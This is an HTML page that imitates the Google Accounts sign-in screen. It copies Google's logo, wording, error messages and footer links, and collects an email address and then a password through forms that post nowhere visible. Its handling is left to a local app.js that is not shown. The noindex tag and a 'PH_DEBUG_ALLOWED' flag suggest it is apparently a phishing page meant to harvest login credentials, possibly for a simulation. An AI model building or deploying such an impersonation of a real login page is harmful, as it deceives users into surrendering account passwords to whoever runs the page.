<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Sign in – Google Accounts</title>
  <meta name="robots" content="noindex,nofollow">
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <link rel="stylesheet" href="style.css">
</head>
<body>

<main class="stage">
  <section class="card" id="card">

    <div class="card-body">
      <div class="col-left">
        <svg class="g-logo" viewBox="0 0 48 48" aria-hidden="true">
          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
        </svg>

        <h1 class="headline" id="stepHeadline">Sign in</h1>
        <p class="subhead" id="stepSubhead">to continue to Google Maps</p>

        <div class="user-chip" id="userChip" hidden>
          <svg viewBox="0 0 24 24" class="chip-avatar" aria-hidden="true"><circle cx="12" cy="12" r="12" fill="#3c4043"/><path fill="#9aa0a6" d="M12 12c2.2 0 4-1.8 4-4s-1.8-4-4-4-4 1.8-4 4 1.8 4 4 4zm0 2c-2.7 0-8 1.3-8 4v2h16v-2c0-2.7-5.3-4-8-4z"/></svg>
          <span class="chip-email" id="chipEmail"></span>
          <button type="button" class="chip-caret" id="chipCaret" aria-label="Switch account">
            <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="#e8eaed" d="M7 10l5 5 5-5H7z"/></svg>
          </button>
        </div>
      </div>

      <div class="col-right">
        <form id="stepEmail" class="step step-email active" autocomplete="off" novalidate>
          <label class="field" id="emailField">
            <input id="email" name="identifier" type="text" placeholder=" " autocomplete="username" autofocus aria-describedby="emailError">
            <span class="field-label">Email or phone</span>
          </label>
          <div class="field-error" id="emailError" role="alert" hidden>
            <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="currentColor" d="M12 2a10 10 0 100 20 10 10 0 000-20zm-1 5h2v7h-2V7zm0 9h2v2h-2v-2z"/></svg>
            <span id="emailErrorText">Enter a valid email or phone number</span>
          </div>
          <a class="link" href="https://accounts.google.com/signin/v2/usernamerecovery" target="_blank" rel="noopener">Forgot email?</a>

          <p class="guest-note">
            Not your computer? Use Guest mode to sign in privately.
            <a class="link" href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener">Learn more about using Guest mode</a>
          </p>

          <div class="actions">
            <a class="btn-text" href="https://accounts.google.com/signup" target="_blank" rel="noopener">Create account</a>
            <button type="submit" class="btn-primary" id="btnNextEmail">Next</button>
          </div>
        </form>

        <form id="stepPassword" class="step step-password" autocomplete="off" novalidate>
          <label class="field" id="passwordField">
            <input id="password" name="Passwd" type="password" placeholder=" " autocomplete="current-password" aria-describedby="passwordError">
            <span class="field-label">Enter your password</span>
          </label>
          <div class="field-error" id="passwordError" role="alert" hidden>
            <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="currentColor" d="M12 2a10 10 0 100 20 10 10 0 000-20zm-1 5h2v7h-2V7zm0 9h2v2h-2v-2z"/></svg>
            <span id="passwordErrorText">Wrong password. Try again or click Forgot password to reset it.</span>
          </div>

          <label class="show-row">
            <input type="checkbox" id="showPassword">
            <span>Show password</span>
          </label>

          <div class="actions">
            <a class="btn-text" href="#" id="tryAnother">Try another way</a>
            <button type="submit" class="btn-primary" id="btnNextPassword">Next</button>
          </div>
        </form>
      </div>
    </div>
  </section>

  <footer class="stage-footer">
    <div class="lang">
      <button type="button" class="lang-btn" aria-haspopup="true">
        English (United States) <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="#9aa0a6" d="M7 10l5 5 5-5H7z"/></svg>
      </button>
    </div>
    <nav class="foot-links" aria-label="Legal">
      <a href="https://support.google.com/accounts" target="_blank" rel="noopener">Help</a>
      <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">Privacy</a>
      <a href="https://policies.google.com/terms"   target="_blank" rel="noopener">Terms</a>
    </nav>
  </footer>
</main>

<script>window.PH_DEBUG_ALLOWED = false;</script>
<script src="app.js"></script>
</body>
</html>
